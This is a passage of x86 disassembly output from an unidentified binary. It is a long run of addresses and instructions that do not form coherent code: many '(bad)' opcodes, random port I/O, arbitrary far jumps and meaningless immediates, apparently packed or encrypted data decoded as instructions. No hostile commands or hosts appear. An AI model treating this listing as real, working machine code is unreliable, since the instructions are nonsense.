  41162d:	mov    ecx,0xa6ec1bd1
  411632:	test   eax,0x5fa5ed23
  411637:	lock push esi
  411639:	scas   eax,DWORD PTR es:[edi]
  41163a:	std    
  41163b:	mov    bl,0x7a
  41163d:	out    0x70,eax
  41163f:	or     esi,esi
  411641:	jae    0x411618
  411643:	jne    0x411663
  411645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411646:	jg     0x41162d
  411648:	push   eax
  411649:	into   
  41164a:	inc    eax
  41164b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41164c:	in     eax,dx
  41164d:	mov    eax,ds:0x738bcf63
  411652:	cmp    edi,DWORD PTR [ebx+0x30]
  411655:	das    
  411656:	lock gs jle 0x411618
  41165a:	cmp    al,0xd2
  41165c:	mov    ebp,0xc4d1c6b
  411661:	adc    al,0x19
  411663:	int3   
  411664:	loop   0x4116c0
  411666:	aas    
  411667:	push   esp
  411668:	mov    bl,cl
  41166a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166b:	sbb    al,0x5b
  41166d:	std    
  41166e:	push   ebx
  41166f:	ins    BYTE PTR es:[edi],dx
  411670:	mov    ch,0x18
  411672:	cs push ebx
  411674:	push   ecx
  411675:	mov    al,ds:0x2ffbe4b2
  41167a:	mov    bh,0x9d
  41167c:	lock je 0x411626
  41167f:	test   DWORD PTR [eax-0x41],esp
  411682:	fucomip st,st(5)
  411684:	xor    eax,0x4e38a709
  411689:	mov    ah,0xb1
  41168b:	cmp    DWORD PTR [eax+0x944346d],eax
  411691:	sub    al,0x4e
  411693:	inc    esi
  411694:	imul   eax,DWORD PTR [edx+0x26ab2b9b],0x1b
  41169b:	aam    0xf1
  41169d:	lock lahf 
  41169f:	mov    BYTE PTR [eax-0x6cf114e3],al
  4116a5:	dec    edi
  4116a6:	mov    ah,0x2f
  4116a8:	or     eax,DWORD PTR [ecx+0x11]
  4116ab:	inc    BYTE PTR [eax-0x35]
  4116ae:	test   BYTE PTR [esi+0x6f],0xa9
  4116b2:	je     0x411652
  4116b4:	push   ecx
  4116b5:	aas    
  4116b6:	ins    DWORD PTR es:[edi],dx
  4116b7:	sbb    ebx,DWORD PTR [eax-0x23]
  4116ba:	cmp    bl,bh
  4116bc:	mov    bl,0x46
  4116be:	scas   eax,DWORD PTR es:[edi]
  4116bf:	call   DWORD PTR [ebp+0x15a2ec8e]
  4116c5:	nop
  4116c6:	add    edi,0x1fc9b7c2
  4116cc:	ins    DWORD PTR es:[edi],dx
  4116cd:	rcr    DWORD PTR [ecx],0x31
  4116d0:	jns    0x411741
  4116d2:	pop    ecx
  4116d3:	pop    edx
  4116d4:	xchg   esp,eax
  4116d5:	loop   0x4116c8
  4116d7:	cmp    eax,0xf2e340e3
  4116dc:	cmp    al,0xeb
  4116de:	clc    
  4116df:	popf   
  4116e0:	(bad)  
  4116e1:	jle    0x411739
  4116e3:	inc    edi
  4116e4:	pop    ebp
  4116e5:	or     al,0x68
  4116e7:	imul   esp,DWORD PTR [ecx-0x6a],0x78
  4116eb:	nop
  4116ec:	cwde   
  4116ed:	add    al,al
  4116ef:	repz (bad) 
  4116f1:	cmp    al,0x3
  4116f3:	aad    0x52
  4116f5:	lds    edi,FWORD PTR gs:[edx+0x3b0bf4a9]
  4116fc:	push   cs
  4116fd:	cmp    ch,cl
  4116ff:	and    eax,0xb30d80b4
  411704:	or     ebp,DWORD PTR [esi-0x28]
  411707:	fcmovbe st,st(7)
  411709:	aas    
  41170a:	arpl   di,di
  41170c:	stos   DWORD PTR es:[edi],eax
  41170d:	iret   
  41170e:	loope  0x411701
  411710:	ja     0x411713
  411712:	mov    BYTE PTR [edi+0x65],bl
  411715:	lods   al,BYTE PTR ds:[esi]
  411716:	sahf   
  411717:	sub    al,dl
  411719:	xor    al,0x2f
  41171b:	loop   0x41176e
  41171d:	cld    
  41171e:	retf   0x6f46
  411721:	mov    cl,0x8e
  411723:	(bad)  
  411724:	fisttp DWORD PTR [ebp-0x7c]
  411727:	fwait
  411728:	shl    DWORD PTR gs:[ebx],0x96
  41172c:	or     DWORD PTR [eax],ebp
  41172e:	inc    edx
  41172f:	mov    DWORD PTR [eax],eax
  411731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411732:	shl    bl,0x7
  411735:	sbb    bl,bh
  411737:	push   ebp
  411738:	cli    
  411739:	mov    ah,0x7e
  41173b:	mov    al,ds:0xc1b61071
  411740:	inc    ebp
  411741:	les    esi,FWORD PTR [edi+0x2a792d95]
  411747:	enter  0x6802,0x10
  41174b:	fcmovbe st,st(3)
  41174d:	(bad)  
  41174e:	lahf   
  41174f:	fsubp  st(3),st
  411751:	mov    eax,ds:0xe7170ff9
  411756:	pop    esp
  411757:	jl     0x41179e
  411759:	das    
  41175a:	mov    ah,0xe0
  41175c:	in     al,dx
  41175d:	push   0xf85ebec2
  411762:	jl     0x4117d1
  411764:	sbb    DWORD PTR [ecx],edx
  411766:	inc    ecx
  411767:	xor    DWORD PTR [edi+0x43],ecx
  41176a:	cmp    eax,eax
  41176c:	mov    BYTE PTR [edx+0x3096ffe9],dl
  411772:	xchg   edi,eax
  411773:	lock call 0x7dcdaa4c
  411779:	jne    0x4117b8
  41177b:	sub    eax,0x531ef799
  411780:	mov    al,ds:0x36e9d986
  411785:	repz sbb al,0xf8
  411788:	adc    ch,cl
  41178a:	out    dx,al
  41178b:	dec    ecx
  41178c:	(bad)
  411791:	dec    ebx
  411792:	cmp    ch,BYTE PTR [edx+esi*4+0x1f]
  411796:	shr    BYTE PTR [esi+0x61],1
  411799:	mov    al,0x69
  41179b:	in     eax,0x9e
  41179d:	dec    ecx
  41179e:	push   ebp
  41179f:	int3   
  4117a0:	fst    DWORD PTR [edi+0x22d3c60c]
  4117a6:	push   cs
  4117a7:	inc    esp
  4117a8:	lods   al,BYTE PTR ds:[esi]
  4117a9:	(bad)  
  4117aa:	and    eax,0xf293615b
  4117af:	and    ch,BYTE PTR [esi+edi*1+0xc]
  4117b3:	neg    DWORD PTR [ecx+0x461daf3]
  4117b9:	xchg   ebp,eax
  4117ba:	xor    edi,esi
  4117bc:	jg     0x4117de
  4117be:	xchg   esp,eax
  4117bf:	std    
  4117c0:	xchg   esi,eax
  4117c1:	jae    0x4117c9
  4117c3:	inc    edx
  4117c4:	cwde   
  4117c5:	jns    0x4117be
  4117c7:	xor    ecx,DWORD PTR cs:[ebx+0x1bfa6b1d]
  4117ce:	daa    
  4117cf:	jmp    0x4117ed
  4117d1:	cmp    al,0x8d
  4117d3:	ret    
  4117d4:	call   0x77db:0xad9a1d9d
  4117db:	jge    0x411803
  4117dd:	mov    bl,0x4c
  4117df:	and    ebp,DWORD PTR [ebp+0x7ca69f4d]
  4117e5:	push   edi
  4117e6:	retf   
  4117e7:	mov    ebx,DWORD PTR ds:0xc9a23912
  4117ed:	or     al,0xa4
  4117ef:	bound  edx,QWORD PTR [ebp+edi*4+0x5fdfd2f]
  4117f6:	bound  edi,QWORD PTR [edx+eax*1]
  4117f9:	adc    DWORD PTR [edi+0x70f2e773],0x7dbae497
  411803:	sbb    eax,0x8b9945a5
  411808:	std    
  411809:	dec    ecx
  41180a:	add    BYTE PTR [eax+0x5d297139],bh
  411810:	push   0x144689f1
  411815:	and    BYTE PTR [edi+0xc],cl
  411818:	fdivr  QWORD PTR [ebp+0x5b]
  41181b:	into   
  41181c:	rcr    BYTE PTR [edi+0x12],cl
  41181f:	stc    
  411820:	sub    BYTE PTR [edx],bl
  411822:	jb     0x411802
  411824:	mov    eax,0xa93a8b9a
  411829:	jae    0x411881
  41182b:	xlat   BYTE PTR fs:[ebx]
  41182d:	in     al,0xe5
  41182f:	mov    dl,0xe1
  411831:	das    
  411832:	pop    ebx
  411833:	cmp    al,0x9d
  411835:	sbb    bh,BYTE PTR [ebp+0x55]
  411838:	lahf   
  411839:	retf   
  41183a:	fwait
  41183b:	mov    ebx,0x8ee39b94
  411840:	add    eax,0xd46a190
  411845:	or     BYTE PTR [edi-0x3b],ch
  411848:	in     eax,dx
  411849:	lods   al,BYTE PTR ds:[esi]
  41184a:	test   DWORD PTR [edi+0x6e80f293],ecx
  411850:	(bad)  
  411852:	fnstsw WORD PTR [eax+0x4179396c]
  411858:	and    eax,0xe807d5c3
  41185d:	inc    eax
  41185e:	xor    edx,DWORD PTR [ebp-0x7]
  411861:	sbb    eax,0xae99f8b2
  411866:	sti    
  411867:	push   edi
  411868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411869:	push   esi
  41186a:	retf   0x26e7
  41186d:	sub    DWORD PTR [edx-0x24],ebp
  411870:	stc    
  411871:	enter  0x1bb1,0x28
  411875:	push   0xbcf01742
  41187a:	test   DWORD PTR [eax],0x321eeadf
  411880:	adc    eax,0xf14e8157
  411885:	mov    DWORD PTR [ebp+0x61],ebp
  411888:	and    DWORD PTR [eax+0x67],ecx
  41188b:	add    DWORD PTR [edx-0x60b3c49f],edx
  411891:	mov    edi,0x148381d9
  411896:	inc    edx
  411897:	xor    DWORD PTR [edi-0x5d],ecx
  41189a:	mov    dl,BYTE PTR [ecx]
  41189c:	je     0x411918
  41189e:	dec    ecx
  41189f:	mov    eax,ds:0xf69be722
  4118a4:	jae    0x4118e0
  4118a6:	pusha  
  4118a7:	mov    ds:0x2726a29d,al
  4118ac:	ret    
  4118ad:	sahf   
  4118ae:	fdivr  st,st(1)
  4118b0:	(bad)  
  4118b2:	cwde   
  4118b3:	jns    0x4118d0
  4118b5:	stos   BYTE PTR es:[edi],al
  4118b6:	sub    DWORD PTR [edi-0x5e30a908],esp
  4118bc:	or     al,0x84
  4118be:	loope  0x4118a4
  4118c0:	test   BYTE PTR [edi+0x3e64d3e1],bh
  4118c6:	enter  0xfd2a,0x3a
  4118ca:	std    
  4118cb:	jmp    0x41186a
  4118cd:	mov    eax,ds:0x14d51b81
  4118d2:	sti    
  4118d3:	mov    BYTE PTR [esi],0x44
  4118d6:	push   edx
  4118d7:	mov    esi,0xa97a6b94
  4118dc:	push   ecx
  4118dd:	mov    ch,0x12
  4118df:	lea    ebx,[esi]
  4118e1:	out    dx,eax
  4118e2:	outs   dx,DWORD PTR ds:[esi]
  4118e3:	mov    ds:0x162604f5,al
  4118e8:	push   ebx
  4118e9:	out    0x76,al
  4118eb:	jae    0x41195b
  4118ed:	mov    bl,0x7c
  4118ef:	mul    ch
  4118f1:	in     eax,0xdd
  4118f3:	pop    es
  4118f4:	mov    edx,0xb669c56b
  4118f9:	loop   0x411904
  4118fb:	push   edi
  4118fc:	dec    ebp
  4118fd:	mov    bl,0x5c
  4118ff:	data16 fiadd DWORD PTR es:[ebx+edx*4]
  411904:	js     0x41188b
  411906:	mov    al,0xb2
  411908:	mov    dl,0x3d
  41190b:	es mov al,0x4b
  41190e:	ins    BYTE PTR es:[edi],dx
  41190f:	les    esp,FWORD PTR [eax+0x1f23d996]
  411915:	aam    0x92
  411917:	sbb    eax,DWORD PTR [eax+eax*1+0x1e8f8129]
  41191e:	or     al,0x30
  411920:	jb     0x4118fd
  411922:	test   DWORD PTR [ebx+edx*1-0x388b786f],edx
  411929:	scas   al,BYTE PTR es:[edi]
  41192a:	adc    DWORD PTR [ecx+0x20],esi
  41192d:	and    edi,DWORD PTR [edi+0x77]
  411930:	jbe    0x4119af
  411932:	(bad)  
  411933:	and    DWORD PTR [ecx+0x3c8d7ce9],ebx
  411939:	push   ebp
  41193a:	mov    DWORD PTR es:[ecx-0x189a8976],edx
  411941:	cmc    
  411942:	hlt    
  411943:	push   edx
  411944:	xchg   ebx,eax
  411945:	rcl    BYTE PTR [edx+0x69],cl
  411948:	push   ecx
  411949:	in     al,0x84
  41194b:	xchg   edi,eax
  41194c:	ficomp DWORD PTR [edx-0x56f5ccd5]
  411952:	les    ebp,FWORD PTR [esi+0x1a0f6d68]
  411958:	jmp    0x3eeb:0xb838da2f
  41195f:	in     eax,0xa4
  411961:	xchg   edx,eax
  411962:	icebp  
  411963:	push   0x94e5420d
  411968:	sahf   
  411969:	sbb    BYTE PTR [esi],cl
  41196b:	aas    
  41196c:	add    DWORD PTR [esi-0x7d],0x1a
  411970:	lods   al,BYTE PTR ds:[esi]
  411971:	fcmovne st,st(1)
  411973:	fcomp  QWORD PTR [ebx-0x3cf1fe5e]
  411979:	sub    al,0xfd
  41197b:	ret    0x8f1d
  41197e:	pop    ebp
  41197f:	fidivr WORD PTR [edi+0x65b107c1]
  411985:	add    eax,DWORD PTR [eax+esi*2+0x59aa7868]
  41198c:	add    bh,dl
  41198e:	push   eax
  41198f:	inc    ebp
  411990:	in     al,dx
  411991:	jl     0x411a12
  411993:	pop    ss
  411994:	hlt    
  411995:	retf   
  411996:	xor    BYTE PTR [edi-0x574e7437],cl
  41199c:	pop    esp
  41199d:	inc    edi
  41199e:	lods   al,BYTE PTR ds:[esi]
  41199f:	and    ebp,edx
  4119a1:	cmp    ebp,esp
  4119a3:	add    DWORD PTR [edx+0x0],edi
  4119a6:	fwait
  4119a7:	imul   edi,DWORD PTR [esi+edi*8],0x16
  4119ab:	mov    dl,0x9b
  4119ad:	mov    eax,0x662e0e20
  4119b2:	mov    ah,0x2d
  4119b4:	mov    fs,esp
  4119b6:	std    
  4119b7:	cmp    al,0x94
  4119b9:	push   edx
  4119ba:	or     al,0xe8
  4119bc:	shr    ebp,cl
  4119be:	scas   eax,DWORD PTR es:[edi]
  4119bf:	dec    edi
  4119c0:	in     eax,0x11
  4119c2:	inc    edx
  4119c3:	dec    ebp
  4119c4:	xchg   BYTE PTR [eax-0x3670f217],dl
  4119ca:	inc    ebp
  4119cb:	shr    cl,cl
  4119cd:	push   es
  4119ce:	rol    BYTE PTR [edx+0x2ac47cb7],cl
  4119d4:	stos   BYTE PTR es:[edi],al
  4119d5:	mov    eax,esp
  4119d7:	out    dx,eax
  4119d8:	jl     0x41199f
  4119da:	and    ah,BYTE PTR [ecx+eiz*2-0x3a]
  4119de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119df:	jb     0x411a3f
  4119e1:	sbb    BYTE PTR [ecx+esi*8+0x33],ch
  4119e5:	daa    
  4119e6:	bound  ecx,QWORD PTR [edi-0x7750eba6]
  4119ec:	push   ds
  4119ed:	pop    es
  4119ee:	mov    bh,0x9b
  4119f0:	in     eax,0x2e
  4119f2:	pop    esi
  4119f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f4:	dec    esi
  4119f5:	or     edi,esi
  4119f7:	ja     0x4119c2
  4119f9:	aaa    
  4119fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119fb:	cdq    
  4119fc:	arpl   WORD PTR ds:0x9d4b22e7,bp
  411a02:	test   eax,0xdefa48d4
  411a07:	dec    esp
  411a08:	add    BYTE PTR [esi],al
  411a0a:	inc    esi
  411a0b:	scas   eax,DWORD PTR es:[edi]
  411a0c:	pusha  
  411a0d:	pop    es
  411a0e:	out    0xdc,al
  411a10:	repz mov al,ds:0x305b38c4
  411a16:	or     BYTE PTR [eax+0x69],ch
  411a19:	pop    ebp
  411a1a:	data16 and bh,BYTE PTR [edx+0x65]
  411a1e:	loopne 0x411a20
  411a20:	je     0x411a41
  411a22:	retf   
  411a23:	inc    ebx
  411a24:	pop    esp
  411a25:	mov    ds:0xeccbf5b2,al
  411a2a:	cwde   
  411a2b:	dec    esp
  411a2c:	pop    esi
  411a2d:	hlt    
  411a2e:	popf   
  411a2f:	adc    BYTE PTR [ebx],bl
  411a31:	mov    ebx,0x7b7a421a
  411a36:	push   ss
  411a37:	dec    ebp
  411a38:	xor    eax,0xb5042b1b
  411a3d:	rcr    ebx,cl
  411a3f:	pushf  
  411a40:	aam    0x66
  411a42:	push   edi
  411a43:	xchg   ebp,eax
  411a44:	hlt    
  411a45:	jne    0x4119f4
  411a47:	pop    ecx
  411a48:	push   esi
  411a49:	test   BYTE PTR [ebx],cl
  411a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a4c:	mov    cl,dh
  411a4e:	aaa    
  411a4f:	jg     0x411ab6
  411a51:	mov    ah,0x72
  411a53:	sub    al,0x4
  411a55:	push   ebx
  411a56:	mov    esp,0x5d563d0b
  411a5b:	push   0x21
  411a5d:	lea    edi,[esi+0x20]
  411a60:	sbb    esp,DWORD PTR [eax]
  411a62:	mov    dh,0x12
  411a64:	jle    0x411a7d
  411a66:	fsubr  st(2),st
  411a68:	imul   DWORD PTR [eax-0x523bdaef]
  411a6e:	xchg   edx,eax
  411a6f:	inc    ebp
  411a70:	aad    0x8a
  411a72:	cmp    edx,ebx
  411a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a75:	and    dl,BYTE PTR [ebx-0x68237c66]
  411a7b:	xchg   BYTE PTR [edx],al
  411a7d:	ror    ch,1
  411a7f:	inc    ecx
  411a80:	push   es
  411a81:	inc    eax
  411a82:	rcl    DWORD PTR [eax],1
  411a84:	dec    ebx
  411a85:	and    cl,BYTE PTR [ebx]
  411a87:	sub    al,0xe5
  411a89:	lods   al,BYTE PTR ds:[esi]
  411a8a:	push   ebp
  411a8b:	rol    BYTE PTR [ebx],1
  411a8d:	and    ebx,DWORD PTR [eax-0x4e2a2173]
  411a93:	push   cs
  411a94:	dec    ebx
  411a95:	lahf   
  411a96:	enter  0xebe1,0xf4
  411a9a:	and    al,BYTE PTR [edx+0xae0afc8]
  411aa0:	aas    
  411aa1:	xor    BYTE PTR [eax-0x22c52716],ah
  411aa7:	jns    0x411a82
  411aa9:	adc    al,0xe7
  411aab:	test   BYTE PTR [edx],cl
  411aad:	sub    eax,0x5d5b6d8
  411ab2:	jp     0x411a52
  411ab4:	xor    BYTE PTR [edx],bh
  411ab6:	sub    bh,BYTE PTR [eax-0x232dcf]
  411abc:	inc    ebp
  411abd:	mov    ah,0x32
  411abf:	mov    eax,ds:0xe7537e9
  411ac4:	and    al,0x9b
  411ac6:	enter  0x9ec9,0x87
  411aca:	push   0xfffffff6
  411acc:	xor    al,0x83
  411ace:	and    edi,DWORD PTR [edx*8-0x641a08b5]
  411ad5:	push   esp
  411ad6:	sbb    DWORD PTR [ebx+0x47],ecx
  411ad9:	xor    DWORD PTR [ecx-0x32],0xe83b7f55
  411ae0:	arpl   cx,si
  411ae2:	sbb    al,0x75
  411ae4:	nop
  411ae5:	int3   
  411ae6:	stos   DWORD PTR es:[edi],eax
  411ae7:	or     DWORD PTR [esi+ebx*8-0x1a],ebp
  411aeb:	pop    ss
  411aec:	mul    DWORD PTR [eax+0x56]
  411aef:	pop    edi
  411af0:	mov    esp,0x5d0a181a
  411af5:	cdq    
  411af6:	xchg   esp,eax
  411af7:	sub    al,0x1c
  411af9:	xor    edi,DWORD PTR [edx]
  411afb:	inc    eax
  411afc:	adc    al,0x13
  411afe:	inc    ebx
  411aff:	and    DWORD PTR [edx],eax
  411b01:	int    0xc8
  411b03:	je     0x411b35
  411b05:	jns    0x411b22
  411b07:	xor    eax,0xe89db5c2
  411b0c:	push   edx
  411b0d:	in     al,dx
  411b0e:	xchg   DWORD PTR [edi+0xa382f70],ecx
  411b14:	pop    edx
  411b15:	push   ebx
  411b16:	outs   dx,DWORD PTR ds:[esi]
  411b17:	retf   0x572a
  411b1a:	lods   al,BYTE PTR ds:[esi]
  411b1b:	inc    ebp
  411b1c:	or     eax,0x9f605ab4
  411b21:	sbb    eax,0xb9c975e6
  411b26:	neg    BYTE PTR [esi-0x4300d320]
  411b2c:	jns    0x411af8
  411b2e:	retf   
  411b2f:	mov    dl,0xeb
  411b31:	(bad)  
  411b33:	loop   0x411ba6
  411b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b36:	loope  0x411b00
  411b38:	xchg   esp,eax
  411b39:	in     al,0xf
  411b3b:	(bad)  
  411b3c:	jmp    0xc6a9:0xfec4cd66
  411b43:	lds    ecx,FWORD PTR [eax-0x6131fcb3]
  411b49:	jg     0x411bc5
  411b4b:	inc    eax
  411b4c:	jmp    0x8403:0xe9c018d8
  411b53:	pop    edi
  411b54:	mov    ds:0xd45b9b01,al
  411b59:	out    dx,al
  411b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b5b:	mov    ebp,0x72b30900
  411b60:	xor    ch,dh
  411b62:	repnz inc eax
  411b64:	mov    al,0x81
  411b66:	mov    ebx,0xb1dc2a82
  411b6b:	xor    BYTE PTR [eax+0x2d],al
  411b6e:	jb     0x411be3
  411b70:	dec    ebx
  411b71:	cmp    al,0x4a
  411b73:	cld    
  411b74:	xchg   DWORD PTR [eax-0x37],ebx
  411b77:	hlt    
  411b78:	enter  0x3874,0x3
  411b7c:	jecxz  0x411afe
  411b7e:	mov    dh,0xb0
  411b80:	xchg   edi,eax
  411b81:	inc    ecx
  411b82:	and    ch,BYTE PTR [eax]
  411b84:	cmp    BYTE PTR [ecx],ch
  411b86:	repz jl 0x411b9f
  411b89:	jmp    0x26767658
  411b8e:	(bad)  
  411b8f:	mov    eax,ds:0xc5b30b30
  411b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b95:	fidivr DWORD PTR [ebx+0x71]
  411b98:	xchg   DWORD PTR [esp+esi*8-0x448f30f0],ecx
  411b9f:	mov    eax,0x2602af16
  411ba4:	outs   dx,BYTE PTR ds:[esi]
  411ba5:	push   ebp
  411ba6:	leave  
  411ba7:	push   0x625705f1
  411bac:	pop    ss
  411bad:	fwait
  411bae:	mov    DWORD PTR [esi-0x75c0e6fe],ebp
  411bb4:	adc    eax,0x3495806b
  411bb9:	pushf  
  411bba:	push   ebp
  411bbb:	jo     0x411bfb
  411bbd:	xor    al,0x20
  411bbf:	pop    ebx
  411bc0:	jecxz  0x411bc9
  411bc2:	into   
  411bc3:	sub    bh,BYTE PTR [edx-0x63d2b20f]
  411bc9:	push   ecx
  411bca:	sar    DWORD PTR [ebx-0x1c18a25e],1
  411bd0:	js     0x411b7b
  411bd2:	and    DWORD PTR [esi+0x8],edi
  411bd5:	sti    
  411bd6:	mov    bl,0xc1
  411bd8:	xchg   esp,eax
  411bd9:	fcomp  DWORD PTR [ebp+eax*1-0x644038d1]
  411be0:	pop    eax
  411be1:	mov    esi,esi
  411be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be4:	push   esp
  411be5:	xchg   esp,eax
  411be6:	xsave  [edx+esi*2-0x5543df3b]
  411bee:	mov    esi,0xafb9aa0c
  411bf3:	loope  0x411b7b
  411bf5:	push   ss
  411bf6:	xchg   esi,eax
  411bf7:	test   al,0x26
  411bf9:	shr    DWORD PTR [edi+ebx*2+0x57],0xa6
  411bfe:	sbb    BYTE PTR [eax+0xe],dh
  411c01:	dec    ebp
  411c02:	loope  0x411bc1
  411c04:	pop    ecx
  411c05:	pop    ds
  411c06:	int    0xe4
  411c08:	push   ss
  411c09:	int3   
  411c0a:	fcmovbe st,st(5)
  411c0c:	push   ebx
  411c0d:	fcomp  DWORD PTR [esp+edi*8-0x271e0c8b]
  411c14:	sbb    al,0x40
  411c16:	push   cs
  411c17:	adc    ch,0xfe
  411c1a:	add    DWORD PTR [eax],0x54
  411c1d:	pop    edx
  411c1e:	mov    dh,0xa8
  411c20:	xchg   ebp,eax
  411c21:	and    DWORD PTR [ebp+0x5e70f4a0],esp
  411c27:	xchg   esi,esi
  411c29:	ja     0x411c5f
  411c2b:	js     0x411c83
  411c2d:	int3   
  411c2e:	jno    0x411c93
  411c30:	push   es
  411c31:	and    al,0x96
  411c33:	sbb    eax,0xbfcbc67d
  411c38:	adc    DWORD PTR [ecx-0x2768516],0xffffffe1
  411c3f:	out    0x75,al
  411c41:	addr16 adc eax,0x308eab3d
  411c47:	sti    
  411c48:	scas   eax,DWORD PTR es:[edi]
  411c49:	in     al,0xe
  411c4b:	xlat   BYTE PTR ds:[ebx]
  411c4c:	push   esp
  411c4d:	outs   dx,DWORD PTR ds:[esi]
  411c4e:	in     al,dx
  411c4f:	push   esi
  411c50:	aas    
  411c51:	or     esp,esi
  411c53:	lods   eax,DWORD PTR ds:[esi]
  411c54:	jno    0x411cae
  411c56:	imul   DWORD PTR [esi+eax*2]
  411c59:	pushf  
  411c5a:	jmp    0x94b7:0x5d8adb1f
  411c61:	dec    eax
  411c62:	cmp    esi,DWORD PTR [edx-0x75932049]
  411c68:	aas    
  411c69:	jecxz  0x411c8f
  411c6b:	lahf   
  411c6c:	push   edx
  411c6d:	add    dl,BYTE PTR [eax+0x55]
  411c70:	inc    esp
  411c71:	mov    ?,WORD PTR [ebx+0x1e83ba59]
  411c77:	push   esp
  411c78:	adc    al,0xb9
  411c7a:	pushf  
  411c7b:	popf   
  411c7c:	stos   BYTE PTR es:[edi],al
  411c7d:	lahf   
  411c7e:	(bad)  
  411c7f:	in     eax,0xba
  411c81:	inc    ebp
  411c82:	scas   al,BYTE PTR es:[edi]
  411c83:	js     0x411c20
  411c85:	or     BYTE PTR [eax-0x8],ah
  411c88:	cmc    
  411c89:	add    BYTE PTR [ebx+0x78f914d8],dh
  411c8f:	mov    fs,WORD PTR [ebx-0x5a25f75f]
  411c95:	xchg   ebp,eax
  411c96:	push   es
  411c97:	rcr    eax,cl
  411c99:	cmp    DWORD PTR [esi-0x2c86e3e6],esi
  411c9f:	pop    ecx
  411ca0:	xchg   ebp,eax
  411ca1:	jno    0x411cd2
  411ca3:	adc    esp,edx
  411ca5:	dec    ebp
  411ca6:	mov    ah,0x76
  411ca8:	lock sub eax,0xe31e091d
  411cae:	push   ds
  411caf:	(bad)  
  411cb0:	or     al,0xef
  411cb2:	mov    ebx,0x891ac1b1
  411cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb8:	push   ebp
  411cb9:	mov    es,WORD PTR [eax]
  411cbb:	cli    
  411cbc:	push   eax
  411cbd:	push   esp
  411cbe:	push   eax
  411cbf:	jecxz  0x411ccd
  411cc1:	pop    eax
  411cc2:	(bad)  
  411cc3:	or     edi,edi
  411cc5:	jge    0x411ca1
  411cc7:	pop    ebp
  411cc8:	dec    edi
  411cc9:	jmp    0x7b47:0xda0df7f5
  411cd0:	out    0xa4,eax
  411cd2:	sbb    DWORD PTR [edi+0x5a],esi
  411cd5:	mov    bh,0x73
  411cd7:	and    BYTE PTR [ebp+0x61092d42],0xc7
  411cde:	fcmovnbe st,st(1)
  411ce0:	jg     0x411d08
  411ce2:	mov    BYTE PTR [ecx-0x1e804220],bh
  411ce8:	cmp    BYTE PTR [ebx-0x4d],ah
  411ceb:	push   ecx
  411cec:	pop    edx
  411ced:	in     al,dx
  411cee:	(bad)  
  411cef:	rol    BYTE PTR [edx+0x58496ec4],cl
  411cf5:	or     dl,BYTE PTR [eax]
  411cf7:	bnd jle 0x411ca1
  411cfa:	xor    al,0x7a
  411cfc:	sbb    al,0x8f
  411cfe:	fild   DWORD PTR [ebx+0x7b]
  411d01:	mov    al,ds:0x20acb28e
  411d06:	shr    DWORD PTR [esi+0x3c0dfe0b],1
  411d0c:	mov    al,ds:0xc596df47
  411d11:	and    bh,BYTE PTR [eax]
  411d13:	out    0x61,eax
  411d15:	sub    al,0xfd
  411d17:	cmc    
  411d18:	jmp    FWORD PTR [edx-0x10]
  411d1b:	aas    
  411d1c:	cli    
  411d1d:	bound  eax,QWORD PTR fs:[esi]
  411d20:	test   ah,0xa2
  411d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d24:	xchg   ebx,eax
  411d25:	mov    dh,0x68
  411d27:	loop   0x411cea
  411d29:	(bad)  
  411d2a:	pop    ds
  411d2b:	inc    eax
  411d2c:	jno    0x411cf0
  411d2e:	push   ss
  411d2f:	push   eax
  411d30:	popf   
  411d31:	sbb    al,0x80
  411d33:	jle    0x411d3c
  411d35:	mov    ch,0x65
  411d37:	cld    
  411d38:	dec    ebx
  411d39:	mov    gs:0x28f0d907,eax
  411d3f:	xor    eax,0x35116684
  411d44:	mov    bl,0x90
  411d46:	or     eax,0x301b95e8
  411d4b:	je     0x411d66
  411d4d:	pop    esp
  411d4e:	jae    0x411d4d
  411d50:	xor    al,0x17
  411d52:	adc    DWORD PTR [eax+0x2a],esp
  411d55:	loope  0x411d4a
  411d57:	fcmovnb st,st(3)
  411d59:	loopne 0x411dc7
  411d5b:	jne    0x411d34
  411d5d:	jne    0x411d8b
  411d5f:	(bad)  
  411d60:	in     al,dx
  411d61:	(bad)  
  411d62:	mov    bh,0xd
  411d64:	dec    eax
  411d65:	pop    fs
  411d67:	outs   dx,BYTE PTR ds:[esi]
  411d68:	lds    edi,FWORD PTR [esi]
  411d6a:	sub    esi,DWORD PTR [edx]
  411d6c:	pop    esp
  411d6d:	in     al,0xe0
  411d6f:	jb     0x411d7b
  411d71:	xor    eax,0x58c116c5
  411d76:	cmp    DWORD PTR [ecx-0x60db5e24],0xffffffdd
  411d7d:	and    ebx,DWORD PTR [ebp+0x2d3f086b]
  411d83:	jo     0x411dfa
  411d85:	cmp    eax,0x3ee67f91
  411d8a:	push   ebx
  411d8b:	(bad)  
  411d8c:	xlat   BYTE PTR ds:[ebx]
  411d8d:	pop    ecx
  411d8e:	mov    al,0x5c
  411d90:	in     eax,0x8c
  411d92:	pop    ebx
  411d93:	push   esi
  411d94:	mov    ah,0x9f
  411d96:	lods   eax,DWORD PTR ds:[esi]
  411d97:	mov    ebp,edi
  411d99:	sub    DWORD PTR [eax+0x5900f6ad],ebp
  411d9f:	fistp  QWORD PTR [eax]
  411da1:	pop    ds
  411da2:	jns    0x411d24
  411da4:	and    ebp,DWORD PTR [esp+ecx*4-0x1bc964c9]
  411dab:	pop    ebp
  411dac:	add    al,0x1
  411dae:	repnz or eax,0x49d9fe88
  411db4:	retf   0x7069
  411db7:	arpl   bx,bx
